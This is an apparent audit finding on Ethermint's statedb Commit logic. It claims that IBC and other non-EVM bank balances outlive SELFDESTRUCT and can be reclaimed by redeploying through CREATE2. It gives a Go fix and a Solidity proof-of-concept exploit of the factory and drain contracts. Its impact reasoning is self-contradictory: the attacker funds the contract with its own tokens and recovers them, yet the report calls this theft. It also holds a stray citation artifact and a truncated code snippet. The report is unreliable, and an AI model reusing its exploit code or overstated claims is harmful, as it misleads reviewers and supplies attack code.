### Title
Non-EVM-Native Token Balances Persist After SELFDESTRUCT, Recoverable via CREATE2 Recreation - (File: x/evm/statedb/statedb.go)

### Summary

When a contract selfdestructs, `Commit()` in `x/evm/statedb/statedb.go` only burns the EVM-native denom balance. Non-EVM-native tokens (IBC, CosmWasm bridge tokens) held by the destroyed address are explicitly left as orphaned bank balances. Because Cosmos SDK bank balances are stored by address (not by account), these balances survive `DeleteAccount()` and are fully recoverable by recreating the contract at the same address via CREATE2. This is a direct analog to the ENS "unslashable subnode" class: the cleanup mechanism (SELFDESTRUCT) only reaches one layer of state (EVM denom), leaving a deeper layer (non-EVM bank balances) irrevocable and exploitable.

### Finding Description

After `RemoveAccount`, the non-EVM bank balances at the address are not zeroed. They remain in the bank module's KV store, keyed by the raw address bytes. When a new account is subsequently created at the same address (e.g., via CREATE2 redeployment), the new account inherits those balances because the bank module resolves balances by address, not by account identity.

The `selfDestructChange` journal entry stores `prevbalance` but the `Revert` path only restores the `selfDestructed` flag; balance restoration relies entirely on the `nativeChange` entries from `SubBalance()`. This means the balance accounting for non-EVM tokens is never journaled at all — they are invisible to the EVM journal and therefore also invisible to the cleanup path. [3](#0-2) 

### Impact Explanation

An attacker who controls a contract that holds non-EVM-native tokens (IBC denoms, CosmWasm bridge tokens) can:

1. Deploy a contract at address `A` via CREATE2 with salt `S` (sets `newContract = true`).
2. Within the same transaction, use an IBC or bank precompile to credit non-EVM tokens to address `A`.
3. Call SELFDESTRUCT on the contract in the same transaction. Because `newContract = true`, `SelfDestruct6780` calls `SelfDestruct()`, marking the account for deletion. The EVM denom is burned; non-EVM tokens remain.
4. In a subsequent transaction, redeploy the contract at address `A` using the same CREATE2 salt `S`. A new auth account is created at `A`.
5. The new contract at `A` can now drain the non-EVM token balances that survived the selfdestruct.

The attacker recovers Cosmos bank funds (IBC tokens) that should have been permanently inaccessible after selfdestruct. This constitutes unauthorized theft of Cosmos bank funds through Ethermint stateDB commit logic.

### Likelihood Explanation

The attack requires:
- A deployment that includes IBC or bank precompiles enabling non-EVM token transfers within an EVM transaction (e.g., Cronos-style deployments built on this Ethermint base).
- The contract to be created and selfdestructed in the same transaction (EIP-6780 / post-Shanghai constraint).
- The attacker to control the contract's selfdestruct function.

These conditions are realistic in production Ethermint-based chains that expose IBC precompiles. The codebase's own comment acknowledges the gap without addressing the CREATE2 recovery vector, indicating the exploit path was not considered during the fix.

### Recommendation

In `Commit()`, before calling `DeleteAccount`, enumerate and burn **all** bank balances at the destroyed address, not only the EVM denom:

```go
// Drain ALL bank balances, not just the EVM denom.
allBalances := s.keeper.GetAllBalances(cacheCtx, cosmosAddr)
for _, coin := range allBalances {
    if _, err := s.keeper.SubBalance(cacheCtx, cosmosAddr, coin); err != nil {
        return errorsmod.Wrap(err, "failed to burn post-selfdestruct non-EVM balance")
    }
}
```

Alternatively, assert that no non-EVM balances exist at selfdestruct time and return an error if they do, forcing the transaction to revert rather than leaving irrecoverable state.

### Proof of Concept

```solidity

pragma solidity ^0.8.0;

interface IBankPrecompile {
    // Hypothetical IBC/bank precompile at 0x0000...0064
    function sendIBCToken(address to, string calldata denom, uint256 amount) external;
    function getBalance(address addr, string calldata denom) external view returns (uint256);
    function transfer(address to, string calldata denom, uint256 amount) external;
}

contract Victim {
    function drain(address attacker, string calldata denom) external {
        IBankPrecompile bank = IBankPrecompile(address(0x64));
        uint256 bal = bank.getBalance(address(this), denom);
        if (bal > 0) bank.transfer(attacker, denom, bal);
    }
    function destroy() external { selfdestruct(payable(msg.sender)); }
}

contract AttackerFactory {
    IBankPrecompile constant BANK = IBankPrecompile(address(0x64));
    bytes victimCode = type(Victim).creationCode;

    // Step 1+2+3: deploy, fund with IBC token, selfdestruct — all in one tx
    function attack(bytes32 salt, string calldata denom, uint256 amount)
        external returns (address victim)
    {
        bytes memory code = victimCode;
        assembly { victim := create2(0, add(code, 0x20), mload(code), salt) }
        require(victim != address(0));
        // Fund the victim with non-EVM IBC tokens via precompile
        BANK.sendIBCToken(victim, denom, amount);
        // Selfdestruct: EVM denom burned, IBC tokens orphaned at victim address
        Victim(victim).destroy();
    }

    // Step 4+5: redeploy at same address, drain orphaned IBC tokens
    function recover(bytes32 salt, string calldata denom)
        external returns (address victim)
    {
        bytes memory code = victimCode;
        assembly { victim := create2(0, add(code, 0x20), mload(code), salt) }
        require(victim != address(0));
        // IBC tokens are still at victim address — drain them
        Victim(victim).drain(msg.sender, denom);
    }
}
```

```go
func (k *Keeper) DeleteAccount(ctx sdk.Context, addr common.Address) error {
	cosmosAddr := sdk.AccAddress(addr.Bytes())
	acct := k.accountKeeper.GetAccount(ctx, cosmosAddr)
	if acct == nil {
		return nil
	}

	// NOTE: only Ethereum accounts (contracts) can be selfdestructed
	_, ok := acct.(ethermint.EthAccountI)
	if !ok {
		return errorsmod.Wrapf(types.ErrInvalidAccount, "type %T, address %s", acct, addr)
	}

	// clear storage
	k.ForEachStorage(ctx, addr, func(key, _ common.Hash) bool {
		k.SetState(ctx, addr, key, nil)
		return true
	})

	// remove auth account
	k.accountKeeper.RemoveAccount(ctx, acct)

	k.debugLog(ctx, "account suicided",
		"ethereum-address", addr,
		"cosmos-address", cosmosAddr,
	)

	return nil
```
